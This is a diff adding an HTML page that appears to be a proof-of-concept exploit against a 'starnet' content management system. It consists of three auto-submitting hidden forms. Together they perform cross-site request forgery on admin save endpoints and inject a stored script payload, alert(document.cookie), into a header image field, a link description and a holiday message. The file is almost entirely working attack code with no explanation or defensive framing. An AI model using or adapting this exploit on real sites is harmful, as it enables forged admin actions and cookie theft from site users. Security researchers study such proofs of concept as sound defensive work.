@@ -1,0 +1,101 @@
+&lt;form action=&quot;http://www.example.com/starnet/index.php?option=modulemanager&amp;module=3&amp;modoption=saveconfig&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;general[0]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;general[1]&quot; value=&quot;#99FFFF&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;general[2]&quot; value=&quot;900&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;general[3]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;general[4]&quot; value=&quot;#000066&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;header[1]&quot; value=&quot;header4.php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;header[2]&quot; value=&quot;290&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;header[3]&quot; value=&#039;starnet/media/header-bg.jpg&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;header[4]&quot; value=&quot;Century Schoolbook&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;header[5]&quot; value=&quot;55&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;header[6]&quot; value=&quot;#FFFFFF&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;header[7]&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;header[0]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section[1]&quot; value=&quot;section1.php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section[2]&quot; value=&quot;#FF0000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section[3]&quot; value=&quot;#99CC99&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section[4]&quot; value=&quot;#0099CC&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section[5]&quot; value=&quot;Arial&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section[6]&quot; value=&quot;14&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section[7]&quot; value=&quot;#FFFFFF&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section[8]&quot; value=&quot;100&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section[9]&quot; value=&quot;#0099CC&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section[0]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status[1]&quot; value=&quot;status3.php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status[2]&quot; value=&quot;#FF33FF&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status[3]&quot; value=&quot;Arial&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status[4]&quot; value=&quot;10&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status[5]&quot; value=&quot;#CCFFCC&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status[6]&quot; value=&quot;Location:&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status[7]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status[8]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status[9]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status[0]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu[1]&quot; value=&quot;menu1.php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu[2]&quot; value=&quot;#CC66FF&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu[3]&quot; value=&quot;#FF9966&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu[4]&quot; value=&quot;#FF66FF&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu[5]&quot; value=&quot;#CCCC99&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu[6]&quot; value=&quot;Arial&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu[7]&quot; value=&quot;14&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu[8]&quot; value=&quot;#000000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu[9]&quot; value=&quot;starnet/themes/editable/arrow_blue.gif&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu[0]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content[0]&quot; value=&quot;content1.php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content[1]&quot; value=&quot;#FFFFFF&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content[2]&quot; value=&quot;#FFFF99&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content[3]&quot; value=&quot;630&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content[4]&quot; value=&quot;500&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content[5]&quot; value=&quot;Arial&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content[6]&quot; value=&quot;10&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content[7]&quot; value=&quot;#000000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content[8]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;footer[1]&quot; value=&quot;footer2.php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;footer[2]&quot; value=&quot;#003366&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;footer[3]&quot; value=&quot;Arial&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;footer[4]&quot; value=&quot;10&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;footer[5]&quot; value=&quot;#FFFFFF&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;footer[6]&quot; value=&quot;Page last changed:&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;footer[7]&quot; value=&quot;25&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;footer[0]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;savebutton&quot; value=&quot; Save&quot; /&gt;
+
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+&lt;form action=&quot;http://www.example.com/starnet/index.php?option=modulemanager&amp;module=2&amp;modoption=save_link&amp;suboption=&amp;page_id=3&amp;link_id=2&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;link_category&quot; value=&quot;ICT&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;link_title&quot; value=&quot;Google&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;link_url&quot; value=&quot;http://www.google.com&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;link_description&quot; value=&#039;Search Engine.&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;link_sort&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;page_id&quot; value=&quot;3&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;initial&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;savebutton&quot; value=&quot; Save&quot; &gt;
+
+
+
+&lt;form action=&quot;http://www.example.com/starnet/index.php?option=modulemanager&amp;module=13&amp;modoption=save_message&amp;suboption=&amp;message_id=1&amp;cat_id=4&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;intro_message&quot; value=&quot;Holiday&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;days&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;page_id&quot; value=&quot;4&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;Director&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;date&quot; value=&quot;09-07-2010&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;message&quot; value=&#039;Next week is a holiday so all the children are free&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;savebutton&quot; value=&quot; Save&quot;&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
